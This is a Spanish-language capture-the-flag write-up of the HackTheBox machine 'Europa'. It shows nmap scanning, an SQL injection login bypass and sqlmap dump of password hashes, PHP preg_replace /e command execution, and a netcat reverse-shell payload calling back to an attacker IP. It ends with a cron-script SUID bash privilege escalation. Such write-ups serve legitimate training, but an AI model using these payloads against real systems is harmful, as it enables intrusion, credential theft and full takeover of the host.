---
date: 2023-05-08 12:00:00
layout: post
title: Europa Writeup
subtitle: Writeup de la máquina Europa de la plataforma HackTheBox
description: Realizaré la máquina Europa explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Media.
image: https://v3ded.github.io/img/blog/htb-europa/htb-europa-00.png
optimized_image: https://v3ded.github.io/img/blog/htb-europa/htb-europa-00.png
category: Writeup
tags:
  - HackTheBox
  - Writeup
  - Medium
  - Linux
author: FredBrave
---
# Enumeración
Empezamos con un escaneo con nmap a la maquina. Este sera rapido solo para descubrir los puertos abiertos. Una vez descubiertos proseguiremos con un escaneo mas exhaustivo hacia estos para averiguar versiones y servicios corriendo en estos puertos.
```bash
sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.129.189.189 -oG Targeted
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 11:48 EDT
Nmap scan report for 10.129.189.189
Host is up (0.17s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 65.91 seconds

sudo nmap -p22,80,443 -sCV 10.129.189.189 -oN Target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 11:51 EDT
Nmap scan report for 10.129.189.189
Host is up (0.18s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b55420af7068c67c0e25c05db09fb78 (RSA)
|   256 b1ea5ec41c0a969e93db1dad22507475 (ECDSA)
|_  256 331f168dc024785f5bf56d7ff7b4f2e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-title: 400 Bad Request
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.96 seconds
```
De este escaneo logre sacar mucha informacion como por ejemplo los dominios, www.europacorp.htb, admin-portal.europacorp.htb. Estos dominios ya me garantizan que la maquina esta usando virtual hosting.
Agregaremos estos dominios al final del /etc/hosts para que al buscarlos en el navegador los encuentre.
<img class="img" src="/assets/img/machines/Europa/1.png" width="800">
Ahora al buscar estos dominios en el navegador deberia poder encontrarlos.
Al tratar de encontrar los dominios por http me daba errores, pero en https la busqueda salio bien para el dominio admin-portal.europacorp.htb. 
<img class="img" src="/assets/img/machines/Europa/2.png" width="800">
# SQLI
No encontraba mucho mas asi que trate de ingresar a la web con credenciales tipicas, pero ninguna funciono por lo que tuve que recurrir a vulnerabilidades tipicas de los login.
Para probar esto abri el burpsuite ya que la web no me dejaba mandar la inyeccion. Tome la peticion que se hace al tratar de loguearse y la mande al repeater.
<img class="img" src="/assets/img/machines/Europa/3.png" width="1000">
Al tratar de inyectar sql no me daba respuestas diferentes por lo que pensaba que talvez no era vulnerable eso hasta que al mandar un `'UNION SELECT 1-- -` la respuesta me mando un error sql.
<img class="img" src="/assets/img/machines/Europa/4.png" width="800">
Por el error sabia que mi inyeccion no tenia la cantidad de columnas correctas por lo que segui mandando con diferentes columnas hasta que 5 columnas me dieron una respuesta diferente `'UNION SELECT 1,2,3,4,5-- -`
<img class="img" src="/assets/img/machines/Europa/5.png" width="800">
Una vez hecha esta peticion pruebo y me doy cuenta por el 302 que he bypasseado el login, por lo que antes de seguir con la sqli me devuelvo a la web con el login y la recargo, entonces la web me envia a dashboard.php.
<img class="img" src="/assets/img/machines/Europa/6.png" width="800">
Podemos tambien usar sqlmap en la peticion para que este me encuentre la informacion contenida en la base de datos.
En mi caso guardare la peticion que se hace en el burpsuite sin la inyeccion en un archivo de texto.
```bash
cat req.txt 
POST /login.php HTTP/1.1
Host: admin-portal.europacorp.htb
Cookie: PHPSESSID=ncqkkisttk0m4g6aq0pldo9gi6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: https://admin-portal.europacorp.htb
Referer: https://admin-portal.europacorp.htb/login.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=asas%40as.com&password=asas
```
Entonces empiezo a usar el sqlmap
```bash
sqlmap -r req.txt -p ‘email’ —threads 9 —batch --force-ssl
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:10:21 /2023-05-08/

[14:10:21] [INFO] parsing HTTP request from 'req.txt'
[14:10:21] [INFO] testing connection to the target URL
[14:10:23] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:10:24] [INFO] testing if the target URL content is stable
[14:10:25] [INFO] target URL content is stable
[14:10:27] [INFO] heuristic (basic) test shows that POST parameter 'email' might be injectable (possible DBMS: 'MySQL')
[14:10:28] [INFO] heuristic (XSS) test shows that POST parameter 'email' might be vulnerable to cross-site scripting (XSS) attacks
[14:10:28] [INFO] testing for SQL injection on POST parameter 'email'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[14:10:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:10:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:10:43] [INFO] testing 'Generic inline queries'
[14:10:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[14:11:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[14:11:45] [WARNING] reflective value(s) found and filtering out
[14:11:55] [WARNING] user aborted during detection phase
how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit] 
[*] ending @ 14:11:57 /2023-05-08/
```
Comprobamos que es vulnerable asi que seguimos con encontrar las bases de datos.
```bash
sqlmap -r req.txt -p ‘email’ —threads 9 —batch --force-ssl --dbs
[14:21:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[14:21:58] [INFO] fetching database names
[14:21:59] [INFO] starting 2 threads
[14:22:01] [INFO] retrieved: 'information_schema'
[14:22:01] [INFO] retrieved: 'admin'
available databases [2]:
[*] admin
[*] information_schema

[14:22:01] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin-portal.europacorp.htb'

[*] ending @ 14:22:01 /2023-05-08/
```
Tratamos de encontrar las tablas de la base de datos admin.
```bash
sqlmap -r req.txt --force-ssl --batch -D admin --tables
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: email=asas@as.com' RLIKE (SELECT (CASE WHEN (4404=4404) THEN 0x617361734061732e636f6d ELSE 0x28 END))-- AmID&password=as

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: email=asas@as.com' AND GTID_SUBSET(CONCAT(0x716a786271,(SELECT (ELT(3158=3158,1))),0x717a6a7671),3158)-- HasV&password=as

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=asas@as.com' AND (SELECT 4405 FROM (SELECT(SLEEP(5)))yfqM)-- XuKF&password=as
---
[14:24:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[14:24:03] [INFO] fetching tables for database: 'admin'
[14:24:06] [INFO] retrieved: 'users'
Database: admin
[1 table]
+-------+
| users |
+-------+

[14:24:06] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin-portal.europacorp.htb'

[*] ending @ 14:24:06 /2023-05-08/
```
Ahora la informacion de la tabla users
```bash
sqlmap -r req.txt --force-ssl --batch -D admin -T users --dump
[14:25:24] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[14:25:24] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[14:25:24] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[14:25:24] [INFO] starting 4 processes 
[14:25:33] [WARNING] no clear password(s) found                                                                                                                                                                                              
Database: admin
Table: users
[2 entries]
+----+----------------------+--------+----------------------------------+---------------+
| id | email                | active | password                         | username      |
+----+----------------------+--------+----------------------------------+---------------+
| 1  | admin@europacorp.htb | 1      | 2b6d315337f18617ba18922c0b9597ff | administrator |
| 2  | john@europacorp.htb  | 1      | 2b6d315337f18617ba18922c0b9597ff | john          |
+----+----------------------+--------+----------------------------------+---------------+

[14:25:33] [INFO] table 'admin.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/admin-portal.europacorp.htb/dump/admin/users.csv'
[14:25:33] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin-portal.europacorp.htb'

[*] ending @ 14:25:33 /2023-05-08/
```
Los hashes para john como para admin son el mismo asi que al crackearlo encuentro que la password de ambos es “SuperSecretPassword!”
# Shell como www-data
Enumero la pagina y encuentro el archivo tools.php el cual parece ser un configurador de openvpn.
<img class="img" src="/assets/img/machines/Europa/7.png" width="800">
Al darle al boton New Configuration se envia la siguiente peticion
```bash
POST /tools.php HTTP/1.1
Host: admin-portal.europacorp.htb
Cookie: PHPSESSID=ncqkkisttk0m4g6aq0pldo9gi6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1678
Origin: https://admin-portal.europacorp.htb
Referer: https://admin-portal.europacorp.htb/tools.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

pattern=%2Fip_address%2F&ipaddress=&text=%22openvpn%22%3A+%7B%0D%0A++++++++%22vtun0%22%3A+%7B%0D%0A++++++++++++++++%22local-address%22%3A+%7B%0D%0A++++++++++++++++++++++++%2210.10.10.1%22%3A+%22%27%27%22%0D%0A++++++++++++++++%7D%2C%0D%0A++++++++++++++++%22local-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22mode%22%3A+%22site-to-site%22%2C%0D%0A++++++++++++++++%22openvpn-option%22%3A+%5B%0D%0A++++++++++++++++++++++++%22--comp-lzo%22%2C%0D%0A++++++++++++++++++++++++%22--float%22%2C%0D%0A++++++++++++++++++++++++%22--ping+10%22%2C%0D%0A++++++++++++++++++++++++%22--ping-restart+20%22%2C%0D%0A++++++++++++++++++++++++%22--ping-timer-rem%22%2C%0D%0A++++++++++++++++++++++++%22--persist-tun%22%2C%0D%0A++++++++++++++++++++++++%22--persist-key%22%2C%0D%0A++++++++++++++++++++++++%22--user+nobody%22%2C%0D%0A++++++++++++++++++++++++%22--group+nogroup%22%0D%0A++++++++++++++++%5D%2C%0D%0A++++++++++++++++%22remote-address%22%3A+%22ip_address%22%2C%0D%0A++++++++++++++++%22remote-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22shared-secret-key-file%22%3A+%22%2Fconfig%2Fauth%2Fsecret%22%0D%0A++++++++%7D%2C%0D%0A++++++++%22protocols%22%3A+%7B%0D%0A++++++++++++++++%22static%22%3A+%7B%0D%0A++++++++++++++++++++++++%22interface-route%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++%22ip_address%2F24%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++%22next-hop-interface%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++++++++++%22vtun0%22%3A+%22%27%27%22%0D%0A++++++++++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++%7D%0D%0A++++++++++++++++%7D%0D%0A++++++++%7D%0D%0A%7D%0D%0A++++++++++++++++++++++++++++++++
```
Al decodear el urlencode puedo ver que la data enviada es la siguiente:
```bash
pattern=/ip_address/&ipaddress=&text="openvpn": {
        "vtun0": {
                "local-address": {
                        "10.10.10.1": "''"
                },
                "local-port": "1337",
                "mode": "site-to-site",
                "openvpn-option": [
                        "--comp-lzo",
                        "--float",
                        "--ping 10",
                        "--ping-restart 20",
                        "--ping-timer-rem",
                        "--persist-tun",
                        "--persist-key",
                        "--user nobody",
                        "--group nogroup"
                ],
                "remote-address": "ip_address",
                "remote-port": "1337",
                "shared-secret-key-file": "/config/auth/secret"
        },
        "protocols": {
                "static": {
                        "interface-route": {
                                "ip_address/24": {
                                        "next-hop-interface": {
                                                "vtun0": "''"
                                        }
                                }
                        }
                }
        }
}
```
Lo mas interesante de esta info es el campo pattern que al parecer es el patron que esta buscando este busca el patron por // y investigando descubro que se hace con una funcion php llamada `preg_replace()`. Al obtener mas informacion sobre esta funcion descubro que puede <a href='https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace'>ejecutar</a> comandos a traves del especificador `\e`. 
Sabiendo ya todo esto intento ejecutar comandos con la siguiente peticion.
```bash
pattern=%2Ffred%2Fe&ipaddress=system("id")&text=fred
```
Y viendo la respuesta encontre el comando ejecutandose
```bash
<div class="panel-body">
                 <p>uid=33(www-data) gid=33(www-data) groups=33(www-data)</p>
 <a href="tools.php" class="btn btn-lg btn-success btn-block">
```
Ahora para lograr una reverse shell utilice el payload de pentest monkey.
```bash
pattern=%2Ffred%2Fe&ipaddress=system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.42+443+>/tmp/f")&text=fred
```
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.42] from (UNKNOWN) [10.129.189.199] 38556
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
Hago un tratamiento de la tty.
```bash
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@europa:/var/www/admin$ ^Z
CTRL + Z
[1]  + 6002 suspended  nc -nlvp 443

$ stty raw -echo;fg
[1]  + 6002 continued  nc -nlvp 443
ENTER
www-data@europa:/var/www/admin$ export TERM=xterm
www-data@europa:/var/www/admin$ export SHELL=bash
www-data@europa:/var/www/admin$ stty rows 48 columns 238
www-data@europa:/var/www/admin$ ls
dashboard.php  data  db.php  dist  index.php  js  login.php  logout.php  logs  tools.php  vendor
www-data@europa:/var/www/admin$
```
# Shell como root
Enumerando encuentro que un script de ejecuta cada minuto en crontabs.
```bash
www-data@europa:/var/www/admin$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *	root	/var/www/cronjobs/clearlogs
www-data@europa:/var/www/admin$
```
Al enumerar el arhivo veo que ejecuta el contenido de otro archivo el cual me pertenece.
```bash
www-data@europa:/var/www/admin$ cat /var/www/cronjobs/clearlogs
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
www-data@europa:/var/www/admin$ ls -la /var/www/cmd/logcleared.sh
-rw-r--r-- 1 www-data www-data 32 May  8 20:48 /var/www/cmd/logcleared.sh
```
Entonces modifico el contenido de este archivo
```bash
www-data@europa:/var/www/admin$ nano /var/www/cmd/logcleared.sh
www-data@europa:/var/www/admin$ chmod +x /var/www/cmd/logcleared.sh
www-data@europa:/var/www/admin$ cat /var/www/cmd/logcleared.sh
#!/bin/bash

chmod +s /bin/bash
```
Y despues de un minuto encuentro el permiso s en el binario /bin/bash
```bash
www-data@europa:/var/www/admin$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
www-data@europa:/var/www/admin$ bash -p
bash-4.3# whoami
root
bash-4.3#
```
Hemos pwneado la maquina!!!




